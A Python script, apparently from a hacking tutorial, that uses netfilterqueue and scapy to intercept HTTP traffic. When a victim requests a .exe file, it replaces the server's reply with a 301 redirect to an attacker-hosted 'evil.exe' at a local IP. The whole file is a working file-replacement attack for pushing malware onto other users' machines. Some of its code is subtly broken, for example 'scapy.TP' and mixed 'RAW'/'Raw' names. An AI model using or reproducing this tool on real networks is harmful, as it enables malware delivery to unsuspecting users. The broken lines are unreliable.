#!/usr/bin/env python 
import netfilterqueue
import scapy.all as scapy 

ack_list = []

def set_load(packet, load):
    packet[scapy.RAW].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet 

def process_packet(packet):
    scapy_packet = scapy.TP(packet.get_payload())
    if scapy_packet.haslayer(scapy.RAW):
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load:  #replace exe with pdf 
                print("[+] exe Request ")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.16/evil-files/evil.exe\n\n"  )    #replace with machine ip, navigate to evil files and add the path .
               
                packet.set_payload(bytes(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run() 